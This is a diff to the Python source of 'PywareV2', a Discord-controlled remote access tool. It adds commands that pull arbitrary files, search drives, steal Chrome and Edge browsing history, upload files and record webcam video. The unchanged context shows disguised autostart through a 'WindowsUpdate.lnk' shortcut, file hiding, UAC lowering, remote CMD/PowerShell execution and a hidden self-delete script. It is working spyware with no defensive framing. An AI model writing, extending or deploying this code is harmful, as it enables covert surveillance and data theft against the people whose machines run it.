@@ -1,6 +1,7 @@
 import discord
 from discord.ext import commands
 import os
+import aiohttp
 import platform
 import io
 from PIL import Image
@@ -108,12 +109,8 @@ def setup_autostart():
         )
         shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
         
-        # Nur erstellen wenn nicht vorhanden
         if not os.path.exists(shortcut_path):
-            # Datei verstecken
             ctypes.windll.kernel32.SetFileAttributesW(bot_path, 2)
-            
-            # Shortcut erstellen
             vbs_script = f"""
             Set oWS = WScript.CreateObject("WScript.Shell")
             Set oLink = oWS.CreateShortcut("{shortcut_path}")
@@ -1056,13 +1053,13 @@ async def self_destruct(ctx, pc_name: str):
         return
 
     try:
-        # 1. Simple confirmation message
+
         await ctx.send(
             "⚠️ **WARNING: This will permanently delete ALL bot files!**\n"
             "Type `!confirm` in the next 30 seconds to proceed or do nothing to cancel."
         )
 
-        # 2. Wait for confirmation
+
         def check(m):
             return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "!confirm"
         
@@ -1071,14 +1068,13 @@ async def self_destruct(ctx, pc_name: str):
         except asyncio.TimeoutError:
             return await ctx.send("✅ Self-destruct canceled (timeout).")
 
-        # 3. Get all file paths
+
         bot_path = os.path.abspath(sys.argv[0])
         startup_shortcut = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk'
         )
 
-        # 4. Create a VBS deletion script
         vbs_script = f"""
         Set fso = CreateObject("Scripting.FileSystemObject")
         On Error Resume Next
@@ -1090,21 +1086,18 @@ async def self_destruct(ctx, pc_name: str):
         fso.DeleteFile WScript.ScriptFullName
         """
 
-        # 5. Save and execute the VBS script
         temp_dir = tempfile.gettempdir()
         vbs_file = os.path.join(temp_dir, "cleanup.vbs")
         
         with open(vbs_file, "w") as f:
             f.write(vbs_script)
 
-        # Run hidden
         subprocess.Popen(
             ['wscript.exe', '//B', vbs_file],
             shell=True,
             creationflags=subprocess.CREATE_NO_WINDOW
         )
 
-        # 6. Shutdown bot
         await ctx.send("💀 All bot files will be deleted. Shutting down...")
         await bot.close()
         sys.exit(0)
@@ -1145,7 +1138,7 @@ async def help_command(ctx):
     
     embed = discord.Embed(
         title="🤖 PywareV2 - Command Help",
-        description="**Admin Remote Control Bot**\nPrefix: `!` | All commands require your PC-Name",
+        description="**Admin Remote Control Bot**\nPrefix: `!`",
         color=0x3498db
     )
 
@@ -1162,7 +1155,20 @@ async def help_command(ctx):
             "`!cmd PC-Name \"command\"` - Run CMD commands\n"
             "`!powershell PC-Name \"script\"` - Run PowerShell\n"
             "`!stop PC-Name` - Shutdown bot\n"
-            "`!kill PC-Name` - Self-destruct bot"
+            "`!kill PC-Name` - Self-destruct bot\n"
+            "`!clean` - Delete last 750 messages"
+        ),
+        inline=False
+    )
+
+    # File Commands (NEW)
+    embed.add_field(
+        name="📁 **File Commands**",
+        value=(
+            "`!uploadfile PC-Name` - Upload attached file\n"
+            "`!downloadfile PC-Name \"Path\"` - Download a file\n"
+            "`!filefind PC-Name \"Filename\"` - Search for files\n"
+            "`!browserhistory PC-Name` - Get Chrome/Edge history"
         ),
         inline=False
     )
@@ -1172,7 +1178,7 @@ async def help_command(ctx):
         name="🌐 **Network/Web**",
         value=(
             "`!blockwebsite PC-Name \"URL\"` - Block a site\n"
-            "`!unblockwebsite PC-Name \"URL\"` - Unblock it\n"
+            "`!unblockwebsite PC-Name \"URL\"` - Unblock it"
         ),
         inline=False
     )
@@ -1183,6 +1189,7 @@ async def help_command(ctx):
         value=(
             "`!screenshot PC-Name` - Capture all monitors\n"
             "`!webcam PC-Name` - Take webcam photo\n"
+            "`!clip PC-Name [Duration]` - Record webcam video\n"
             "`!recdesktop PC-Name [Seconds]` - Record screen\n"
             "`!recmicrophone PC-Name [Seconds]` - Record audio"
         ),
@@ -1197,7 +1204,7 @@ async def help_command(ctx):
             "`!bluescreen PC-Name` - Trigger BSOD\n"
             "`!rickroll PC-Name` - Rickroll the user\n"
             "`!lock PC-Name` - Lock system\n"
-            "`!unlock PC-Name` - Unlock system\n"
+            "`!unlock PC-Name` - Unlock system"
         ),
         inline=False
     )
@@ -1314,7 +1321,7 @@ async def block_website(ctx, pc_name: str, url: str):
         with open(hosts_path, 'a') as f:
             f.write(f"\n127.0.0.1 {clean_url}\n")
             if not clean_url.startswith("www."):
-                f.write(f"127.0.0.1 www.{clean_url}\n")  # Blockiere auch www-Version
+                f.write(f"127.0.0.1 www.{clean_url}\n")
         
         await ctx.send(f"✅ Blocked: `{clean_url}` + `www.{clean_url}`")
     except Exception as e:
@@ -1330,13 +1337,11 @@ async def unblock_website(ctx, pc_name: str, url: str):
         hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
         clean_url = url.replace("https://", "").replace("http://", "").split("/")[0]
         
-        # Lese Hosts-Datei und filtere ALLE Varianten der URL (mit/ohne www)
         with open(hosts_path, 'r') as f:
             lines = f.readlines()
         
         with open(hosts_path, 'w') as f:
             for line in lines:
-                # Behalte Zeilen, die NICHT die URL enthalten (weder mit noch ohne www)
                 if clean_url not in line and f"www.{clean_url}" not in line:
                     f.write(line)
         
@@ -1345,6 +1350,179 @@ async def unblock_website(ctx, pc_name: str, url: str):
         await ctx.send("❌ Permission denied. Run bot as Administrator!")
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command(name="uploadfile")
+async def upload_file(ctx, pc_name: str):
+    """Upload attached file to target PC (!uploadfile PC-Name)"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    if not ctx.message.attachments:
+        return await ctx.send("❌ Please attach a file to upload")
+
+    try:
+        attachment = ctx.message.attachments[0]
+        if attachment.size > 25 * 1024 * 1024:
+            return await ctx.send("❌ File too large (max 25MB)")
+
+        uploads_dir = os.path.join(tempfile.gettempdir(), "uploads")
+        os.makedirs(uploads_dir, exist_ok=True)
+        filepath = os.path.join(uploads_dir, attachment.filename)
+
+        await attachment.save(filepath)
+        await ctx.send(
+            f"✅ File saved to: `{filepath}`\n"
+            f"Size: {attachment.size / 1024:.2f} KB",
+            delete_after=15
+        )
+
+    except Exception as e:
+        await ctx.send(f"❌ Upload error: {str(e)}")
+        print(f"[Upload Error] {traceback.format_exc()}")
+
+@bot.command(name="browserhistory")
+async def browser_history(ctx, pc_name: str):
+    """Get Chrome/Edge browser history (!browserhistory PC-Name)"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        history = []
+        browsers = {
+            'Chrome': os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'),
+            'Edge': os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History')
+        }
+
+        for browser, path in browsers.items():
+            if os.path.exists(path):
+                temp_db = os.path.join(tempfile.gettempdir(), f"{browser}_history_temp")
+                shutil.copy2(path, temp_db)
+
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+                results = cursor.fetchall()
+                conn.close()
+
+                if results:
+                    history.append(f"\n**{browser} History (Last {len(results)} entries):**")
+                    for idx, (url, title, timestamp) in enumerate(results, 1):
+                        history.append(f"{idx}. [{title}]({url}) - <t:{int(timestamp/1000000-11644473600)}:R>")
+
+        if not history:
+            return await ctx.send("❌ No browser history found (Chrome/Edge not detected)")
+
+        chunks = []
+        current_chunk = []
+        for line in history:
+            if len('\n'.join(current_chunk + [line])) > 1500:
+                chunks.append('\n'.join(current_chunk))
+                current_chunk = [line]
+            else:
+                current_chunk.append(line)
+        chunks.append('\n'.join(current_chunk))
+
+        for chunk in chunks:
+            await ctx.send(chunk[:2000])
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+        print(f"[BrowserHistory Error] {traceback.format_exc()}")
+
+@bot.command(name="downloadfile")
+async def download_file(ctx, pc_name: str, file_path: str):
+    """Download a file from the target PC (!downloadfile PC-Name "C:\path\to\file")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        file_path = file_path.strip('"\'')
+        
+        if not os.path.exists(file_path):
+            return await ctx.send(f"❌ File not found: `{file_path}`")
+            
+        if not os.path.isfile(file_path):
+            return await ctx.send(f"❌ Path is not a file: `{file_path}`")
+            
+        file_size = os.path.getsize(file_path)
+        if file_size > 25 * 1024 * 1024:
+            return await ctx.send("❌ File too large (max 25MB)")
+
+        filename = os.path.basename(file_path)
+        
+        await ctx.send(f"⬇️ Preparing to download: `{filename}` ({file_size/1024:.2f} KB)")
+        
+        with open(file_path, 'rb') as file:
+            await ctx.send(
+                f"📁 **File downloaded** from {get_pc_name().upper()}",
+                file=discord.File(file, filename=filename)
+            )
+            
+    except PermissionError:
+        await ctx.send("❌ Permission denied. Bot needs admin rights!")
+    except Exception as e:
+        await ctx.send(f"❌ Error downloading file: {str(e)}")
+        print(f"[Download Error] {traceback.format_exc()}")
+
+@bot.command(name="filefind")
+async def file_find(ctx, pc_name: str, filename: str):
+    """Search for files on the target PC (!filefind PC-Name "filename")"""
+    if pc_name.lower() != get_pc_name():
+        return
+
+    try:
+        filename = filename.strip('"\'')
+        await ctx.send(f"🔍 Searching for `{filename}` on {get_pc_name().upper()}...")
+
+        # Use Windows search if available
+        if os.name == 'nt':
+            try:
+                # Method 1: Using Windows search (fast but might miss some files)
+                cmd = f'where /r C:\\ {filename} 2>nul'
+                if ':' in filename:  # If full path specified
+                    cmd = f'where /r {os.path.splitdrive(filename)[0] + "\\"} {os.path.basename(filename)} 2>nul'
+                
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+                found_files = result.stdout.splitlines()
+                
+                # Method 2: Python glob as fallback
+                if not found_files or 'Datei nicht gefunden' in result.stdout:
+                    found_files = []
+                    for drive in ['C:', 'D:', 'E:'] if os.path.exists('C:\\') else ['/']:
+                        for root, _, files in os.walk(drive + '\\' if os.name == 'nt' else '/'):
+                            for file in files:
+                                if fnmatch.fnmatch(file.lower(), filename.lower()):
+                                    found_files.append(os.path.join(root, file))
+                            if len(found_files) >= 50:  # Limit to 50 results
+                                break
+            except subprocess.TimeoutExpired:
+                found_files = []
+
+        if not found_files:
+            return await ctx.send(f"❌ No files matching `{filename}` found")
+
+        # Format results
+        message = f"📂 Found {len(found_files)} matching files:\n"
+        message += "\n".join(f"`{path}`" for path in found_files[:10])  # Show first 10
+        
+        if len(found_files) > 10:
+            # Save full results to temp file
+            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8') as tmp:
+                tmp.write("\n".join(found_files))
+                tmp_path = tmp.name
+            
+            await ctx.send(
+                content=message + f"\n\n📁 Full results ({len(found_files)} files) attached:",
+                file=discord.File(tmp_path, filename="search_results.txt")
+            )
+            os.remove(tmp_path)
+        else:
+            await ctx.send(message)
+
+    except Exception as e:
+        await ctx.send(f"❌ Search error: {str(e)}")
+        print(f"[FileFind Error] {traceback.format_exc()}")
+
 
 setup_autostart()
 set_lowest_uac_level()
